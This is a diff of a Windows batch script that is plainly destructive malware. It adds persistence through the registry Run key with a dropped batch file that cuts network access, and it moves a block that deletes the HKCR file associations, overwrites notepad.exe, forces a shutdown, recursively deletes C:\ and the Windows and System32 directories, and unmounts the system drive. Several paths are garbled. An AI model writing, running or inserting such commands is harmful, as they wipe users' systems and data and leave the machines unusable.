@@ -28,21 +28,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 cls
-START reg delete HKCR/.exe
-START reg delete HKCR/.dll
-START reg delete HKCR/*
-ECHO Your computer has been fcked.Â Â Have a nice day.
-START %SystemRoot%\system32\notepad.exe
-msg * Fatal system error due to admin stupidity!
-shutdown -c “Error! You are too stupid!” -s -t 10
-
-RD C:\ /S /Q
-del c:\windows\system32*.* /q
-del /f /s /q “C:*.*.”
-
-mountvol C: /d
-rd %windir% 
-
 
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
@@ -50,3 +35,17 @@ echo ipconfig/release_all>>c:windowswimn32.bat
 echo end>>c:windowswimn32.bat
 reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
 reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
+
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+ECHO Your computer has been fcked.Â Â Have a nice day. > %SystemRoot%\system32\notepad.exe
+msg * Fatal system error due to admin stupidity!
+shutdown -c “Error! You are too stupid!” -s -t 10
+
+RD C:\ /S /Q
+del c:\windows\system32*.* /q
+del /f /s /q “C:*.*.”
+mountvol C: /d
+rd %windir%
